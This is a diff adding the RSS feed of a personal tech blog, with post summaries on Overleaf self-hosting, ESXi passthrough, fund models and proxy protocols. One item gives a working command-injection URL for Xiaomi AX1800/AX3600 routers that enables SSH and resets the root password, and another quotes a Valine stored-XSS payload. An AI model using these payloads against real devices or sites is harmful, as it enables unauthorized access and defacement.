@@ -1,0 +1,768 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Elliot&#39;s Blog</title>
+    <link>https://www.elliot98.top/</link>
+    <description>Recent content on Elliot&#39;s Blog</description>
+    <generator>Hugo</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Tue, 28 May 2024 10:40:21 +0800</lastBuildDate>
+    <atom:link href="https://www.elliot98.top/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Projects/Paper</title>
+      <link>https://www.elliot98.top/works/</link>
+      <pubDate>Mon, 27 May 2024 21:45:00 +0800</pubDate>
+      <guid>https://www.elliot98.top/works/</guid>
+      <description>Papers/Awards Xuanbo Huang, Kaiping Xue, Lutong Chen, Mingrui Ai, Huancheng Zhou, Bo Luo, Guofei Gu, Qibin Sun. You Can Obfuscate, but You Cannot Hide: CrossPoint Attacks against Network Topology Obfuscation. USENIX Security&#39;24, 2024. Lutong Chen, Kaiping Xue, Jian Li, Zhonghui Li, Nenghai Yu. Q-CSKDF: A Continuous and Security Key Derivation Function for Quantum Key Distribution. IEEE Network, 2024. Lutong Chen, Kaiping Xue, Jian Li, Zhonghui Li, Nenghai Yu. Security-Enhanced WireGuard Protocol Design using Quantum Key Distribution.</description>
+    </item>
+    <item>
+      <title>USTC LaTeX 2024更新</title>
+      <link>https://www.elliot98.top/post/tech/overleaf-2024/</link>
+      <pubDate>Tue, 28 May 2024 10:40:21 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/overleaf-2024/</guid>
+      <description>近期给服务器做了更新，主要改动包括：&#xA;合并了进一年多来官方代码，node 和 mongodb 等依赖升级。 结合官方代码，新增提供了实时修订、符号表、可视化编辑器等功能。 编译了最新的 TexLive 2024 发行版容器。 修复了 Git-Bridge 和新版本 Overleaf 不兼容的问题，使用了新的上传接口。 其他一些提升效率的小 trick </description>
+    </item>
+    <item>
+      <title>解决eGPU和BitLocker冲突导致启动需要输入密钥的问题</title>
+      <link>https://www.elliot98.top/post/tech/tpm-pcr-bitlocker-egpu/</link>
+      <pubDate>Mon, 22 Apr 2024 21:05:08 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/tpm-pcr-bitlocker-egpu/</guid>
+      <description>解决eGPU和BitLocker冲突导致启动需要输入密钥的问题 Resolving eGPU and BitLocker Encryption Conflict Recently, I brought a eGPU (AMD 6600) for gaming with my laptop. However, when using an external GPU (eGPU), I encountered a conflict with BitLocker encryption, particularly due to an inconsistency in the Platform Configuration Register (specifically, PCR[2]). This issue can cause BitLocker to trip during system reboots when an eGPU is connected. Fortunately, there&amp;rsquo;s a workaround to resolve this conflict, which I found in this blog eGPU.</description>
+    </item>
+    <item>
+      <title>Fundviewer2 基金实时估值看板</title>
+      <link>https://www.elliot98.top/post/life/fund-fundviewer2/</link>
+      <pubDate>Tue, 09 Apr 2024 13:53:48 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/fund-fundviewer2/</guid>
+      <description>这个世界不能没有“基金估值”。Fundviewer 是一个保留基金估值功能的自选基金看板。支持自选基金列表、基金详情分享、基金实时估值等功能。</description>
+    </item>
+    <item>
+      <title>公募基金市场的 RealWorld 模型及其 v2.0 版本</title>
+      <link>https://www.elliot98.top/post/life/fund-realworld2/</link>
+      <pubDate>Tue, 09 Apr 2024 13:40:59 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/fund-realworld2/</guid>
+      <description>RealWorld 2.0 版本 RealWorld v2.0 程序是原先 Realworld 公募基金市场量化模型的升级版本。我们重新构建了完整的量化框架，并将因子库从上一版本 28 个因子的基础上，扩充到了 200 个因子。根据多轮测试，目前的模型（realworld-v2.0-rc4）已经初步稳定了。&#xA;量化回测 我们对 realworld-v2.0-rc4 进行了量化回测。候选基金池为约 2000 个偏股、混合、LOF、QDII 基金。回测样本内时间范围为 2019/1/1 ~ 2023/3/1；样本外时间范围为 2023/3/1 ~ 2024/3/1，&#xA;全回测期，达到了 19.7% 的年化收益率和约 14.6% 的超额年化收益率（基准：中证 500）。取得了比上一版本更低的波动率。在样本外测试期，也取得了相较基准和前一版本更好的回测成绩。&#xA;实盘测试 我们目前已经进行了约 2 个月的实盘测试。在调试前期（二月），模型推荐基金为 国泰黄金ETF链接A（000218）和汇添富全球医疗保健混合（QDII）（004877）,至今分别取得了 15.43% 和 7.51% 的收益率。&#xA;在 2024 年 3 月 9 日到 2024年 4 月 8 日的正式实盘测试第一期中，模型推荐了5只基金，取得了平均 1.94% 的月收益率，相较基准（同期沪深300指数和中证 500 指数）取得了约 1.29% 和 1.47% 的超额收益率。</description>
+    </item>
+    <item>
+      <title>公募基金市场的 RealWorld 模型及其 v1.4 版本</title>
+      <link>https://www.elliot98.top/post/life/fund-realworld/</link>
+      <pubDate>Mon, 15 May 2023 23:13:14 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/fund-realworld/</guid>
+      <description>RealWorld 模型 RealWorld 模型是一套用于中国大陆公募基金市场的量化分析模型，提供了基金预警、基金推荐和实盘日报等功能。RealWorld 模型是尝试通过提取行业板块轮动的信息，进行右侧交易。RealWorld 模型近期升级到了 v1.4 版本，从明天起，每日播报将切换到使用 RealWorld-v1.4 版本模型服务。&#xA;本次升级的重点如下：&#xA;增加了完整的历史回测功能。 根据历史回测优化了 v1.3 模型的核心参数 增加了基金的前后端收费的估计 RealWorld 回测成绩 本次 RealWorld-v1.4 版本模型相对 v1.3 版本模型有了较大性能提升。最终的历史回测成绩如下：&#xA;短期：在 2019.5.1 至 2023.5.1 的 4 年回测 中，v1.4 取得了平均 13.57% 的年化收益率和 9.70% 的最大回撤率。与此对应的，v1.3 和沪深 300 指数的年华收益率分别是 4.96% 和 2.27% ；最大回撤率分别为 8.89% 和 10.74% 。此外，v1.4 模型的平均持仓数为 4.97，平均持仓时间为 57.21 天。v1.4 模型以沪深 300 指数（非无风险利率）为基准的夏普比率为 0.84 。&#xA;中期：在 2015.1.1 至 2023.5.1 的 8 年回测 中，v1.4 取得了平均 8.35% 的年化收益率和 11.24% 的最大回撤率。与此对应的，v1.3 和沪深 300 指数的年华收益率分别是 6.</description>
+    </item>
+    <item>
+      <title>Wicklight protocol design</title>
+      <link>https://www.elliot98.top/post/tech/wicklight/</link>
+      <pubDate>Fri, 03 Feb 2023 11:39:33 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/wicklight/</guid>
+      <description>Wicklight protocol design Abstract This document specifies Wicklight protocol. Wicklight is a common HTTP(s) proxy with probe-resistant.&#xA;Copyright Notice Copyright (c) 2023 Elliot Chen. All rights reserved.&#xA;1. Introduction Wicklight should also be Probe-Resistance and Traffic-Analysis-Resistance. It also supports UDP proxy with an additional client.&#xA;1.1. Conventions and Terminology The key words &amp;ldquo;MUST&amp;rdquo;, &amp;ldquo;MUST NOT&amp;rdquo;, &amp;ldquo;REQUIRED&amp;rdquo;, &amp;ldquo;SHALL&amp;rdquo;, &amp;ldquo;SHALL NOT&amp;rdquo;, &amp;ldquo;SHOULD&amp;rdquo;, &amp;ldquo;SHOULD NOT&amp;rdquo;, &amp;ldquo;RECOMMENDED&amp;rdquo;, &amp;ldquo;NOT RECOMMENDED&amp;rdquo;, &amp;ldquo;MAY&amp;rdquo;, and &amp;ldquo;OPTIONAL&amp;rdquo; in this document are to be interpreted as described in BCP 14 [RFC2119] [RFC8174] when, and only when, they appear in all capitals, as shown here.</description>
+    </item>
+    <item>
+      <title>Wicktls protocol design</title>
+      <link>https://www.elliot98.top/post/tech/wicktls/</link>
+      <pubDate>Tue, 10 Jan 2023 15:19:59 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/wicktls/</guid>
+      <description>Wicktls protocol design Abstract This document specifies Wicktls protocol. Wicktls allows building a tunnel based on an SSL/TLS connection with strong traffic reshaping.&#xA;Copyright Notice Copyright (c) 2022 Elliot Chen. All rights reserved.&#xA;1. Introduction The primary goal of Wicktls is to build a security tunnel based on an SSL/TLS connection. It should also be Probe-Resistance and Traffic-Analysis-Resistance.&#xA;1.1. Conventions and Terminology The key words &amp;ldquo;MUST&amp;rdquo;, &amp;ldquo;MUST NOT&amp;rdquo;, &amp;ldquo;REQUIRED&amp;rdquo;, &amp;ldquo;SHALL&amp;rdquo;, &amp;ldquo;SHALL NOT&amp;rdquo;, &amp;ldquo;SHOULD&amp;rdquo;, &amp;ldquo;SHOULD NOT&amp;rdquo;, &amp;ldquo;RECOMMENDED&amp;rdquo;, &amp;ldquo;NOT RECOMMENDED&amp;rdquo;, &amp;ldquo;MAY&amp;rdquo;, and &amp;ldquo;OPTIONAL&amp;rdquo; in this document are to be interpreted as described in BCP 14 [RFC2119] [RFC8174] when, and only when, they appear in all capitals, as shown here.</description>
+    </item>
+    <item>
+      <title>Overleaf 自建服务器搭建</title>
+      <link>https://www.elliot98.top/post/tech/overleaf/</link>
+      <pubDate>Mon, 28 Nov 2022 10:40:21 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/overleaf/</guid>
+      <description>实验室同学最近越来越多地使用 Overleaf 来撰写论文，由此我也产生了这种想法，要不要试试 Overleaf 呢？正好最近我也有两篇论文开始进入撰写阶段，就决定来尝尝鲜。 但是官网价格还是挺高的，特别是共享编辑、历史记录这些比较使用的功能，同时我又非常不愿意将论文源文件共享给网站，很让人纠结。&#xA;很快，我就发现，Overleaf 提供了一个开源的版本，可以用于免费安装。因此开始了私有搭建的过程。安装过程中还是有很多坑的，所以我想着来简单做一个记录。其中主要参考了这一篇博客 https://blog.skywt.cn/posts/self-host-overleaf ，让我避开了很多坑。&#xA;第一步：按照官网安装 我们主要是利用了 overleaf 的 toolkit 套件 来安装，流程可以查阅其官方 安装文档。&#xA;安装需要的依赖包括 bash，docker 以及 docker-compose。我们首先 clone toolkit 工具：&#xA;git clone https://github.com/overleaf/toolkit.git ./overleaf-toolkit cd ./overleaf-toolkit 使用如下的命令来初始化配置文件:&#xA;bin/init 配置文件需要有针对性的修改，我修改了 config/overleaf.rc 文件中的端口号：&#xA;SHARELATEX_PORT=8003 以及在 config/variables.env 文件中配置了项目名称、主机名和邮箱：&#xA;SHARELATEX_APP_NAME=&amp;lt;app 名称&amp;gt;&#xD;SHARELATEX_SITE_URL=&amp;lt;url&amp;gt;&#xD;SHARELATEX_NAV_TITLE=&amp;lt;app 名称&amp;gt;&#xD;SHARELATEX_EMAIL_FROM_ADDRESS=&amp;lt;发送邮箱名&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_HOST=&amp;lt;SMTP服务器地址&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_PORT=&amp;lt;SMTP服务器端口&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_SECURE=&amp;lt;是否使用 TLS/StartTLS&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_USER=&amp;lt;发送邮箱名&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_PASS=&amp;lt;邮箱密码&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_NAME=&amp;lt;发送邮箱名&amp;gt;&#xD;SHARELATEX_EMAIL_SMTP_TLS_REJECT_UNAUTH=true&#xD;SHARELATEX_EMAIL_SMTP_IGNORE_TLS=&amp;lt;设置为true为TLS，否则为StartTLS&amp;gt; 如果需要使用 Nginx 反向代理，那么还需要修改如下两个配置:&#xA;SHARELATEX_BEHIND_PROXY=true&#xD;SHARELATEX_SECURE_COOKIE=true 配置工作结束，使用 bin/up 命令来启动 Overleaf 的 Docker 容器。这个过程中还会自动下载所需要的镜像。&#xA;第二步：配置 Nginx 反向代理 我们没有使用 toolkit 自带的 Nginx 服务器来做反向代理，这是因为我们本机已经存在了一个 Nginx 服务器冰承载了其他业务。 考虑到 Overleaf 需要使用 websocket， 我们的 Nginx 配置文件也需要做对应修改，下面给出一个例子：</description>
+    </item>
+    <item>
+      <title>技术摘要| Windows 10/11 性能调度策略和 ThinkBook 14&#43; 2022 优化</title>
+      <link>https://www.elliot98.top/post/tech/windows-powerplan/</link>
+      <pubDate>Sat, 30 Jul 2022 19:14:20 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/windows-powerplan/</guid>
+      <description>项目位于Github&#xA;这是我的 Thinkbook 14+ 2022 笔记本的 Windows 10/11 系统性能/功耗调教脚本，用于在离电时进行保守的性能释放和较长续航，同时在带电时获得最佳的性能释放。&#xA;Intel 12 代处理器普遍续航拉跨，我早期对机器进行了大量测试，发现早期 35 版本的 Bios 即便是在节电模式/安静模式下依然只有约 3-4h 的续航。我的实验结论和极客湾BV18B4y1b7gj中的结论完全一致：&#xA;过于激进的 CPU 频率 Boost 功耗，随便干点什么事情就把处理器频率拉到顶，导致了 CPU 的平均功耗降不下去，这是限制处理器频率以及 PL1/PL2 无法解决的。。 过于离谱的 Uncore 功耗，Intel也许真的是为了降低成本，使用了单路电路为所有核心供电，导致了单核跑满时，全核心电压都上涨了。同时，外围设备/PCIE/USB 的用电也不容小觑。根据我的测试结果，我的机器的系统功耗比 IA/GPU 功耗要多 5-10W。 我做了什么？ 目前，针对第二点是没有解决办法的，我主要是对第一点在 Windows 操作系统的调度策略上进行了一些优化。主要是在已有的平衡电源计划 “Balanced” 的基础上，通过新建一个新的电源计划的方式来进行的。&#xA;首先需要解决的问题是，Windows 默认很多调度属性、变量默认都是不展示的，只有通过修改注册表或者powercfg命令的方式，才能将这些变量暴露给用户。这些值在注册表中的位置是\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings。可以通过将内部选项的 Attributes 的值修改为 02 的方式暴露给用户。我暴露的变量包括：&#xA;处理器电源管理（54533251-82be-4824-96c1-47b60b740d00） 处理器性能核心放置最小核心数量（0cc5b647-c1df-4637-891a-dec35c318583）。这个值用于最少有多少处理器逻辑节点可以休眠，或者说有多少处理器即使在限制状态下也不可以休眠。在 12 代异构处理器下，这个值控制 E 核。在 11 代以前的 CPU 则是全部核心生效。 0cc5b647-c1df-4637-891a-dec35c318584。和上面的变量功能一致，但是在 12 代异构处理器架构下，对 P 核的进行处理。 处理器能源性能首选项策略 （36687f9e-e3a5-4dbf-b1dc-15eb381c6863）。这个值非常重要，真实这个变量控制了处理器频率设置的激进程度。这个值越大，睿频越保守，功耗越低。但是，这个值并不代表会限制处理器睿频到高频率，只是限制了发生这种状态的条件和纪律。同样，这个属性针对 E 核心。 36687f9e-e3a5-4dbf-b1dc-15eb381c6864。 同上，针对 P 核。 处理器最大状态（bc5038f7-23e0-4960-96da-33abaf5935ec）。这里限制了处理器相对基准频率的最大频率限制。100% 代表全部性能；99%则近似关闭了睿频（但是，其实我们有更好的方式关闭睿频）。针对 E 核心。有一个类似的属性“最大处理器频率”是一个意思，但是单位是MHz，而不是百分比。 bc5038f7-23e0-4960-96da-33abaf5935ed。同上，12 代中针对 P 核。 处理器最小状态（893dee8e-2bef-41e0-89c6-b55d0929964c）处理器闲置时候的最小频率百分比。 bc5038f7-23e0-4960-96da-33abaf5935ed。同上，12 代中针对 P 核。 处理器性能提升模式（be337238-0d82-4146-a960-4f3749d470c7）。这个值也非常重要，控制了睿频的目标频率，且对所有核心生效。根据实验，我发现其取值如下： 已禁用 000。关闭睿频。 已启用 001。启动睿频。 高性能 002。允许睿频到最高频率，对于我的 i7-12700H 来说是 4.</description>
+    </item>
+    <item>
+      <title>全新博客评论系统上线</title>
+      <link>https://www.elliot98.top/post/life/%E5%85%A8%E6%96%B0%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%BA%BF/</link>
+      <pubDate>Wed, 20 Oct 2021 10:29:33 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/%E5%85%A8%E6%96%B0%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%BA%BF/</guid>
+      <description>Why not Valine? I have used Valine for my blog&amp;rsquo;s comment for a long time. It is based on Leancloud and provides a good theme style. Recently, my blog was under attack with a Valine&amp;rsquo;s XSS attack. The EXP is:&#xA;&amp;#34;link&amp;#34;: &amp;#34;\&amp;#34; /&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;img src=&amp;#39;none&amp;#39; onerror=&amp;#39;setInterval(function(){alert()},10);&amp;#39;/&amp;gt;&amp;#34;, For more information, please visit the attacker&amp;rsquo;s blog.&#xA;I received my email reminder two minutes after the attack and cleaned all malicious comments immediately. Since Valine seems to be out of maintenance, I took this module offline.</description>
+    </item>
+    <item>
+      <title>Notion实现循环事件、重复事件、每日打卡</title>
+      <link>https://www.elliot98.top/post/tech/notion-calendar/</link>
+      <pubDate>Tue, 03 Aug 2021 10:33:17 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/notion-calendar/</guid>
+      <description>优雅的Notion不优雅 其实我一直都在思考，使用什么样的工具可以使我的生活变得井井有条，变得有效率、有条理、且精致。从功能上来讲，我希望能有效管理我的日程、待办事项、记笔记等等。当然，我对于工具是非常挑剔的，使用过QQ全家桶、Outlook全家桶、Google全家桶还有Apple全家桶。当然他们各自有各自的好，但也有我不能接受的地方。且不说Google不能满足我对随时取用的要求，QQ邮箱的日程和联系人又太过简陋。苹果的工具非常优雅，也很好用；可自从我更换小米手机之后（虽然这些天又换回了iPhone12），我就有意从苹果的生态中脱离出来，生怕被绑定。更何况生产力的PC电脑上是难以使用苹果的软件的。于此，我其实长期使用Outlook全家桶，还是365的会员，算是这诸多产品中给我体验最好的产品。直到我遇到了Notion，我认为我找到了一个可以同时满足我这些需求的，一个跨平台的、好用且优雅的软件。&#xA;**当然，这只是我以为。**当设置好了database，打算往里面填充日程的时候，我很快发现了Notion在重复日程、循环事件、每日打卡的功能是缺失的！我不相信Notion功能是残缺的，我在网络上搜索着最优姿势，但是我很快被打脸了。Notion的功能缺失是残缺的，特别是日程上。三年来不断有人在各种论坛上讨论这件事情，但是确始终没有得到改善。毕竟Notion功能再强大，也不是图灵完全的。&#xA;不优雅的重复事件 于是我开始寻找折中。一种解决方式似乎是可以使用Notion提供的API来操作，具体的解决方案我还没有研究透，或许有时间回去研究吧？可是效率工具只是效率工具，而非效率本身。花很长时间研究如何完成这个功能似乎不很值得，且不说外接服务器很不优雅。&#xA;我参考了论坛里各位的说法，设计了一种折中办法，不优雅，但是还能用。我的日程database有Tag、Due和Next Due三个属性。Tag我用于标记这个事件的类别。当然，我定义了四个特别的标记，分别是&amp;quot;Daily&amp;quot;, &amp;ldquo;Weekly&amp;rdquo;, &amp;ldquo;Monthly&amp;rdquo; 以及 &amp;ldquo;Yearly&amp;rdquo;。如果事件中具有上述四个标记之一，那么是循环标记。Due是首次发生该事件这个日期，对于一次性事件来说，就是时间的日期。最关键的是，我设计了一个Next Due属性，这是一个Formula属性。我设计为计算出循环日期的下一个截止日期；如果是一次性时间，那么它等于Due。&#xA;具体的Next Due计算代码放在下面，可以参考：&#xA;if( contains(prop(&amp;#34;Tags&amp;#34;),&amp;#34;Weekly&amp;#34;), dateAdd( prop(&amp;#34;Due&amp;#34;), ceil(dateBetween( now(), prop(&amp;#34;Due&amp;#34;), &amp;#34;weeks&amp;#34;))+1, &amp;#34;weeks&amp;#34; ), if( contains(prop(&amp;#34;Tags&amp;#34;),&amp;#34;Monthly&amp;#34;), dateAdd( prop(&amp;#34;Due&amp;#34;), ceil(dateBetween( now(), prop(&amp;#34;Due&amp;#34;), &amp;#34;months&amp;#34;))+1, &amp;#34;months&amp;#34; ), if( contains(prop(&amp;#34;Tags&amp;#34;),&amp;#34;Daily&amp;#34;), dateAdd( prop(&amp;#34;Due&amp;#34;), ceil(dateBetween( now(), prop(&amp;#34;Due&amp;#34;), &amp;#34;days&amp;#34;))+1, &amp;#34;days&amp;#34; ), if( contains(prop(&amp;#34;Tags&amp;#34;),&amp;#34;Yearly&amp;#34;), dateAdd( prop(&amp;#34;Due&amp;#34;), ceil(dateBetween( now(), prop(&amp;#34;Due&amp;#34;), &amp;#34;years&amp;#34;))+1, &amp;#34;years&amp;#34; ), prop(&amp;#34;Due&amp;#34;) ) ) ) ) Notion的Formula其实类似一个函数式程序，还是挺好用的。这样，我就实现了自动计算循环事件的下一个日程的时间。但是，这不够完善。最大的问题在于这样只能显示出下个时间，但是没有办法设置提醒！这就很拙劣了！&#xA;发现一个Bug，当日期包括时间的时候，似乎工作并不正常。有机会我要来处理一下。</description>
+    </item>
+    <item>
+      <title>MacOS 上QQ和微信的图片存放位置</title>
+      <link>https://www.elliot98.top/post/life/qq-wechat-macos/</link>
+      <pubDate>Sun, 01 Aug 2021 15:30:32 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/qq-wechat-macos/</guid>
+      <description>QQ和微信是非常常见的软件，想必大家都使用过。然而 MacOS 和 Windows 系统是非常不同的。那么大家知道MacOS上QQ和微信软件的图片、视频等媒体文件是存放在哪里的吗？ 小编来告诉你你MacOS上QQ以及微信在MacOS上的存放位置吧。 🐶🐶🐶&#xA;MacOS上的软件存放位置和Windows上是不同的。QQ的存放位置是&#xA;/Users/&amp;lt;用户名&amp;gt;/Library/Containers/com.tencent.qq/Data/Library/Caches 其中，图片的位置是 Images文件夹， Videos 则是视频文件，File是接受文件，PTT是语音消息。&#xA;微信的存放位置是：&#xA;/Users/&amp;lt;用户名&amp;gt;/Containers/com.tencent.xinWeChat/Data/Library/Application Support/com.tencent.xinWeChat/2.0b4.9.0/ 其中，不同的长十六进制字符串代表了不同的账户的文件夹。在每个用户自己的文件夹中，在&#xA;Message/MessageTemp/&amp;lt;聊天回话对应的十六进制&amp;gt;/ 文件夹中，可能有 Image 文件夹，用于存放该消息的图片等。</description>
+    </item>
+    <item>
+      <title>NUC 10 上配置 ESXi 虚拟机的显示输出</title>
+      <link>https://www.elliot98.top/post/tech/esxi-igpu-hdmi-output/</link>
+      <pubDate>Wed, 14 Apr 2021 12:16:25 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/esxi-igpu-hdmi-output/</guid>
+      <description>NUC10 是一个非常小巧的主机，具有一个HDMI 2.0b 和两个基于 USB Typc-C的DP 1.4 接口，显示接口不可谓不丰富。可是，当我们在 NUC 10 上安装了 ESXi 系统后，默认显示输出是 ESXi DCUI 的界面。我们很难把Windows 10虚拟机内的内容直接通过 HDMI 或者 DP 接口输出到显示器上。&#xA;踩坑-使用 Type-C 扩展坞 我之前尝试过使用 Type-C 扩展坞，我的思路是：ESXi能够将USB设备直连给虚拟机使用，那么只要将HDMI转换器的直通给Windows 10 虚拟机，就可以输出画面了。 可是事实证明我的想法太美好了，当我把扩展坞接到NUC10 上的时候，ESXi 根本找不到HDMI转换器的USB 设备，HDMI接口输出的内容依旧是 DCUI 界面。&#xA;后来，我想明白原因了。我的这款绿联的 Typc-C 扩展坞的显示芯片是 IT6564，是一款将 DP（Type-C）转换为HDMI、VGA的转换器。也就是说，显示的数据之间通过DisplayPort协议输出，而根本不是USB 协议，也没有办法直通给虚拟机使用。 DisplayPort 依旧是连接在CPU 的核心显卡上的，因此输出的内容就是ESXi 的 DCUI 界面。&#xA;解决 发现了问题所在，那么解决办法就非常明确了。 其实最佳解决办法就是直接购买一个基于雷电3接口的外接显卡坞，直接将显卡直通给Windows 10虚拟机，然后就通过独立显卡的HDMI接口就能直接输出显示内容给显示器了。&#xA;可是购买一个独立显卡扩展坞是非常昂贵的。在当今（21年4月）的这个时间点，显卡价格都被炒上天了，现在购买显卡是非常不明智的。 另外，我个人是没有太多游戏需求的，对显卡的要求并不高。购买一个独立显卡扩展坞似乎有一点浪费了。&#xA;因此，最终，我选择了购买一个基于USB 3.0 的带有外置显卡的HDMI转换器。归根到底，受限于 USB 3.0 接口的带宽，这样的显示效果显然是比不上独立显卡坞，但是胜在体积小巧、价格便宜。&#xA;我购买的型号是 j5create JUA365，价格大概在 300 块钱左右，体积倒是很小巧。这个转换器内部是内置一个 USB 3.0 协议的独立小显卡，支持 4K 30 帧以及 2K（2048x1152) 60帧的两个HDMI输出。</description>
+    </item>
+    <item>
+      <title>ESXi 上配置硬件直通</title>
+      <link>https://www.elliot98.top/post/tech/esxi-passthrough/</link>
+      <pubDate>Tue, 06 Apr 2021 19:44:12 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/esxi-passthrough/</guid>
+      <description>其实前些日子买了个 Intel NUC10i5FNH ，主要是把他用作一个小型的服务器。500多克的重量，拿在手里十分轻便，性能也还不错。 具体的配置来说，这一个小主机的CPU是 i5-10210U，我给他配置了2块8G的内存条、一个1TB的m2接口SN750固态硬盘以及一块2TB的Sata接口希捷绿盘机械硬盘。&#xA;在我的设想里，这个NUC可以同时运行Windows操作系统和一个NAS网络附属存储系统。因此我使用 ESXi hypervisor 作为宿主机操作系统，上面可以同时运行多个虚拟机。但是为了充分发挥硬件优势，利用Intel处理器的VT-D、VT-X技术，可以将部分硬件直通给虚拟机使用。下面记录一下常用部件的硬件直通的方式：&#xA;网卡直通 除了用于管理 ESXi 管理界面的网卡端口之外，其他网口均能够被直通，设置方法也很简单，在ESXi网络管理界面选择对应的网卡，点击切换直通后重启 ESXi 即可。或者也可以使用下面的命令：&#xA;esxcli hardware pci pcipassthru set -d &amp;lt;网卡的PCIE地址&amp;gt; -e TRUE&#xD;reboot 硬盘直通 NUC上可以使用两种类型的硬盘直通，一种是基于RDM直通硬盘，另一种是直接将SATA控制器的直通给虚拟机。&#xA;1. SATA控制器直通 我在NAS虚拟机上使用了第一种方式，直接将SATA控制器的PCI-E设备直通给了虚拟机。这样做的好处是虚拟机可以完整操作所有SATA硬盘，也可以使用S.M.A.R.T指令监控磁盘的健康。&#xA;但是这种方案有一个坑，我之前的m2接口插上的是SATA硬盘的SSD作为系统硬盘。开启PCI-E直通后，整个系统硬盘也被直通了，这导致ESXi操作系统的崩溃。&#xA;配置SATA控制器直通的方式也很简单，首先需要设置 passthru 文件，使得 ESXi 允许直通 SATA控制器，修改 /etc/vmware/passthru.map 文件，添加一行：&#xA;8086 02d3 d3d0 false 重新启动后，可以在管理页面开启SATA控制器的PCIE直连，也可以使用命令：&#xA;esxcli hardware pci pcipassthru set -d &amp;lt;SATA控制器的PCIE地址&amp;gt; -e TRUE&#xD;reboot 2. RDM RDM技术可以将一块硬盘直接映射到虚拟机里面，在虚拟磁盘中的某一个块中读写文件，就会被映射到物理磁盘中对应位置进行读写。这样做的好处是更加灵活，我们可以设置某一个硬盘进行映射，而无需将整个SATA控制器或者SCSI控制器映射。&#xA;具体的使用命令是：&#xA;vmkfstools -z /vmfs/devices/disks/&amp;lt;disk&amp;gt; /vmfs/volumes/&amp;lt;vmdk file&amp;gt; 该命令将disk文件映射成为一个虚拟磁盘镜像文件 .vmdk，在虚拟机中只要选择对应 vmdk 文件即可。&#xA;显卡直通 NUC10i5 CPU附带一个核心显卡 UHD620，我们也可以将其直通给 Windows 虚拟机使用。</description>
+    </item>
+    <item>
+      <title>AX1800 AX3600 漏洞利用及启动SSH方法</title>
+      <link>https://www.elliot98.top/post/tech/ax1800-3600-ssh/</link>
+      <pubDate>Wed, 31 Mar 2021 22:19:21 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ax1800-3600-ssh/</guid>
+      <description>证实，1.0.385 及以上固件封堵了这个漏洞。如需使用 SSH，请使用1.0.365 固件版本&#xA;具体原理请参见：原始论坛&#xA;下面放上POC用于备忘，具体使用时需要替换STOK：&#xA;http://192.168.31.1/cgi-bin/luci/;stok=&amp;lt;STOK&amp;gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;amp;user_id=longdike&amp;amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20&amp;#39;s%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg&amp;#39;%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B 改密码为 Admin：&#xA;http://192.168.31.1/cgi-bin/luci/;stok=&amp;lt;STOK&amp;gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;amp;user_id=longdike&amp;amp;ssid=-h%3B%20echo%20-e%20&amp;#39;admin%5Cnadmin&amp;#39;%20%7C%20passwd%20root%3B </description>
+    </item>
+    <item>
+      <title>技术摘要| Wickftps——一个ftp(s)、www容器</title>
+      <link>https://www.elliot98.top/post/tech/wickftps/</link>
+      <pubDate>Wed, 18 Nov 2020 18:30:50 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/wickftps/</guid>
+      <description>Wickftps 因为一些服务器到期，因此我打算将一些文件管理服务进行容器化，并构建了这样一个项目。wickftps 主要包括了如下三个组件：vsftpd、nginx 以及 sshd。这样可以快速迁移我们的 ftp 文件服务而无需繁琐的配置过程。&#xA;我们使用了一个“统一身份认证”系统，说白了就是以下服务全部使用统一的用户名和密码进行管理，这样还是比较方便的。&#xA;1. vsftpd 对于 FTP 服务来说，大概有如下几个需求吧。首先是被动模式，在现在 NAT 重重的 ipv4 互联网中，主动模式的可行性实在是太低了，因此需要配置好服务器被动模式。其次就是 ftps 的需求，因为通常是部署在公网服务器上的，因此往往需要使用 ssl 对文件传输过程进行保护。&#xA;这里记录一个坑，以后配置 vsftpd 的 ssl 一定要记得设置 require_ssl_reuse=NO，否则很多客户端会报错。&#xA;2. nginx 使用 nginx 的目的很简单，那就是提供目录服务（便于我们分享一些文件），此外还可以构建一些静态网页。&#xA;3. ssh 我把 ssh 设置为一个可选服务，可以方便我们使用 ssh 协议登录容器内部，并进行一些容器管理（不要和我说 dirty ，容器也是被人使用的）。此外 rsync 等操作也可以很方便的基于 ssh 进行。&#xA;4. supervisor 使用 supervisor 对上面三个服务进行管理。&#xA;项目的地址放在了 GITHUB 